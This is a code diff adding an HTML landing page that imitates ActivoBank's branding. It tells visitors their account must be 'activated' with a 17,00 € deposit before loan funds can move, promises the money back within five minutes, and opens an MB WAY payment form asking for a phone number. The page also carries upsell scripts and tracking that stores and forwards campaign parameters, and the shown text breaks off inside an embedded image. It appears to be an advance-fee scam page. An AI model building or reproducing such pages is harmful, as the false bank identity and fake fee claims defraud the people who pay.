@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<script>
+window.apiUrl = window.apiUrl || function (p) {
+  if (!p) return '';
+  if (/^https?:\/\//i.test(p)) return p;
+  var path = p.charAt(0) === '/' ? p : '/' + p;
+  var host = location.hostname;
+  var port = String(location.port || '');
+  if ((host === 'localhost' || host === '127.0.0.1') && port && port !== '8080') {
+    return 'http://127.0.0.1:8080' + path;
+  }
+  return path;
+};
+</script>
+<script src="../extensions/api-base.js"></script>
+<script src="../extensions/fees-loader.js"></script>
+<script src="../extensions/upsell-fees-bridge.js"></script>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title>Opening Fee — ActivoBank</title>
+
+<script defer src="../../cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="3269fe28-2341-4107-9bf9-f1ad9d68455f"></script>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{background:#f3f4f6;color:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;background:#f3f4f6}
+
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:#fff;border-bottom:1px solid #eee}
+  .menu-btn{width:36px;height:36px;border-radius:10px;background:#f1ecff;display:flex;align-items:center;justify-content:center;border:0;cursor:pointer;flex-shrink:0}
+  .menu-btn span{display:block;width:14px;height:2px;background:#0a0a0a;position:relative}
+  .menu-btn span::before,.menu-btn span::after{content:"";position:absolute;left:0;width:14px;height:2px;background:#0a0a0a}
+  .menu-btn span::before{top:-5px}.menu-btn span::after{top:5px}
+  .brand{margin-left:10px;flex:1}
+  .user-block{display:flex;align-items:center;gap:10px}
+  .user-info{text-align:right;line-height:1.1}
+  .user-info .name{font-size:13px;font-weight:600;text-transform:capitalize}
+  .user-info .nif{font-size:11px;color:#9ca3af;letter-spacing:1px}
+  .avatar{width:34px;height:34px;border-radius:50%;border:1.5px solid #0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+  .avatar svg{width:18px;height:18px}
+
+  .card{margin:16px;background:#fff;border-radius:22px;padding:26px 22px;box-shadow:0 1px 2px rgba(0,0,0,.04)}
+  h1{font-size:22px;font-weight:800;letter-spacing:-.5px;margin-bottom:8px}
+  h2.section{font-size:18px;font-weight:800;letter-spacing:-.4px;margin-bottom:16px;text-align:center}
+  .lead{font-size:14px;color:#52525b;line-height:1.5}
+
+  .badge-top{display:inline-flex;align-items:center;gap:6px;background:#eff6ff;border:1px solid #bfdbfe;border-radius:20px;padding:5px 12px;font-size:11px;font-weight:700;color:#1d4ed8;margin-bottom:14px}
+
+  .alert{background:#fef2f2;border:1px solid #fecaca;border-radius:14px;padding:14px 16px;display:flex;gap:12px;align-items:flex-start}
+  .alert-icon{width:36px;height:36px;background:#fee2e2;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+  .alert-icon svg{width:18px;height:18px;color:#dc2626}
+  .alert strong{display:block;font-size:13px;font-weight:700;color:#dc2626;margin-bottom:2px}
+  .alert span{font-size:13px;color:#7f1d1d;line-height:1.45}
+
+  .calc-box{background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:16px;padding:18px;margin:16px 0}
+  .calc-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;font-size:14px;border-bottom:1px solid #e2e8f0}
+  .calc-row:last-child{border-bottom:0;font-weight:800;font-size:16px;padding-top:12px;margin-top:4px}
+  .calc-row .label{color:#52525b}
+  .calc-row .val{font-weight:600;color:#0a0a0a}
+  .calc-row:last-child .val{color:#0a0a0a;font-size:20px}
+
+  .steps-list{list-style:none;margin:14px 0}
+  .steps-list li{display:flex;gap:10px;align-items:flex-start;padding:8px 0;font-size:13px;color:#374151;border-bottom:1px solid #f0f0f3}
+  .steps-list li:last-child{border-bottom:0}
+  .step-num{width:22px;height:22px;border-radius:50%;background:#0a0a0a;color:#fff;font-size:11px;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+
+  .seal{display:flex;align-items:center;gap:8px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;padding:12px 14px;margin-top:16px;font-size:12px;color:#15803d;font-weight:600}
+  .seal svg{width:16px;height:16px;flex-shrink:0}
+
+  .urgency{text-align:center;padding:10px 16px;background:#fff7ed;border:1px solid #fed7aa;border-radius:12px;font-size:13px;font-weight:700;color:#c2410c;margin:0 16px}
+
+  .pay-box{text-align:center}
+  .pay-amount{font-size:38px;font-weight:800;letter-spacing:-1px;color:#0a0a0a;margin:10px 0 6px}
+  .pay-label{font-size:13px;color:#71717a;margin-bottom:6px}
+  .btn-pay{display:block;width:100%;padding:17px;background:#0a0a0a;color:#fff;border:0;border-radius:14px;font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;text-decoration:none;text-align:center;margin-bottom:12px}
+  .btn-pay:active{transform:scale(.99)}
+  .btn-cancel{display:block;width:100%;padding:12px;background:0;border:1.5px solid #e5e7eb;border-radius:14px;font-size:14px;font-weight:600;color:#71717a;font-family:inherit;cursor:pointer;text-align:center}
+  .secure-badge{display:flex;align-items:center;justify-content:center;gap:6px;font-size:12px;color:#71717a;margin-top:12px}
+  .secure-badge svg{width:14px;height:14px;color:#419c63}
+
+  .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:999;align-items:flex-end;justify-content:center}
+  .modal-overlay.show{display:flex}
+  .modal-sheet{background:#fff;border-radius:24px 24px 0 0;padding:28px 22px 36px;width:100%;max-width:480px;animation:slideUp .25s ease;position:relative}
+  @keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+  .modal-close{position:absolute;top:16px;right:18px;background:0;border:0;font-size:22px;cursor:pointer;color:#9ca3af;line-height:1}
+  .modal-logo{display:flex;justify-content:center;margin-bottom:18px}
+  .modal-title{font-size:17px;font-weight:800;text-align:center;margin-bottom:6px}
+  .modal-amount{font-size:32px;font-weight:800;text-align:center;margin-bottom:20px}
+  .modal-status{padding:14px;border-radius:12px;font-size:13px;text-align:center;line-height:1.6}
+  .modal-status.loading{background:#fefce8;border:1.5px solid #fbbf24;color:#92400e}
+  .modal-status.success{background:#f0fdf4;border:1.5px solid #86efac;color:#15803d}
+  .modal-status.error{background:#fef2f2;border:1.5px solid #fecaca;color:#dc2626}
+  .modal-phone-box{margin-bottom:16px}
+  .modal-phone-box label{font-size:12px;font-weight:600;color:#52525b;display:block;margin-bottom:6px}
+  .modal-phone-box input{width:100%;padding:14px;border:1.5px solid #e5e7eb;border-radius:12px;font-size:15px;font-family:inherit;outline:0}
+  .modal-phone-box input:focus{border-color:#0a0a0a}
+  .btn-modal-pay{display:block;width:100%;padding:16px;background:#0a0a0a;color:#fff;border:0;border-radius:14px;font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;margin-top:14px}
+
+  .site-footer{text-align:center;padding:24px 16px 30px;color:#71717a;font-size:11px;background:#fff;margin-top:8px}
+  .site-footer .logo-wrap{display:flex;justify-content:center;margin-bottom:6px}
+</style>
+
+<script>
+(function(){
+  var UTM_KEYS=['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term'];
+  var p=new URLSearchParams(window.location.search);
+  UTM_KEYS.forEach(function(k){ if(p.get(k)) localStorage.setItem(k,p.get(k)); });
+  var changed=false;
+  UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!p.has(k)){p.set(k,v);changed=true;} });
+  if(changed) history.replaceState(null,'','?'+p.toString());
+  document.addEventListener('click',function(e){
+    var a=e.target.closest('a');
+    if(a&&a.href){ try{ var u=new URL(a.href,window.location.href); UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!u.searchParams.has(k)) u.searchParams.set(k,v); }); a.href=u.toString(); }catch(ex){} }
+  },true);
+})();
+</script>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- TOPBAR -->
+  <div class="topbar">
+    <button class="menu-btn" aria-label="menu"><span></span></button>
+    <div class="brand">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="103" height="28" overflow="hidden" role="img" aria-label="ActivoBank"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">ActivoBank</text></svg>
+    </div>
+    <div class="user-block">
+      <div class="user-info">
+        <div class="name" id="userName">customer</div>
+        <div class="nif" id="userNif">*** *** ***</div>
+      </div>
+      <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div class="card" style="margin-top:20px;text-align:center;">
+    <h1 style="font-size:22px;font-weight:800;margin-bottom:12px;">Congratulations! Time to activate your account</h1>
+    <p class="lead" style="text-align:center;margin-bottom:14px;">To activate your account and move your loan funds, a minimum deposit of <span data-fee-amount="suffix">17,00 €</span> is required.</p>
+    <p style="font-size:13px;color:#2563eb;text-align:center;margin-bottom:22px;">Notice: This amount will be deposited into your account within 5 minutes after activation.</p>
+
+    <!-- Value box -->
+    <div style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:16px;padding:20px;margin-bottom:22px;">
+      <div style="font-size:11px;font-weight:700;letter-spacing:1.5px;color:#71717a;margin-bottom:8px;">ACTIVATION AMOUNT</div>
+      <div style="font-size:36px;font-weight:800;letter-spacing:-1px;color:#0a0a0a;"><span data-fee-amount="suffix">17,00 €</span></div>
+    </div>
+
+    <!-- Description -->
+    <p class="lead" style="text-align:center;margin-bottom:22px;"><span data-msg="upsell2.t05">Your ActivoBank Digital Account includes all the features you need to manage your money in Portugal and across Europe.</span></p>
+
+    <!-- Digital Account sub-card -->
+    <div style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:16px;padding:20px 20px 14px;margin-bottom:24px;text-align:left;">
+      <div style="font-size:15px;font-weight:800;text-align:center;margin-bottom:16px;">Digital Account</div>
+      <div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #f0f0f3;">
+        <div style="width:24px;height:24px;border-radius:50%;background:#0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><svg fill="none" stroke="#fff" stroke-width="3" viewBox="0 0 24 24" style="width:13px;height:13px"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t07">MB WAY and 24-hour transfers</span></span>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #f0f0f3;">
+        <div style="width:24px;height:24px;border-radius:50%;background:#0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><svg fill="none" stroke="#fff" stroke-width="3" viewBox="0 0 24 24" style="width:13px;height:13px"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t08">Bill and service payments</span></span>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #f0f0f3;">
+        <div style="width:24px;height:24px;border-radius:50%;background:#0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><svg fill="none" stroke="#fff" stroke-width="3" viewBox="0 0 24 24" style="width:13px;height:13px"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t09">ActivoBank Virtual Card</span></span>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #f0f0f3;">
+        <div style="width:24px;height:24px;border-radius:50%;background:#0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><svg fill="none" stroke="#fff" stroke-width="3" viewBox="0 0 24 24" style="width:13px;height:13px"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t10">IBAN withdrawals</span></span>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;padding:8px 0;">
+        <div style="width:24px;height:24px;border-radius:50%;background:#0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><svg fill="none" stroke="#fff" stroke-width="3" viewBox="0 0 24 24" style="width:13px;height:13px"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t11">24/7 customer support</span></span>
+      </div>
+    </div>
+
+    <!-- Button -->
+    <button class="btn-pay" onclick="abrirModal()"><span data-msg="upsell2.t12">Activate my account now</span></button>
+    <div class="secure-badge" style="margin-top:14px;">
+      <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      100% secure and encrypted payment
+    </div>
+  </div>
+
+  <!-- MODAL MBWAY -->
+  <div class="modal-overlay" id="payModal">
+    <div class="modal-sheet">
+      <button class="modal-close" onclick="closeModal()"><span data-msg="upsell2.t14">×</span></button>
+      <div class="modal-logo"><img src="data:image/png;base64,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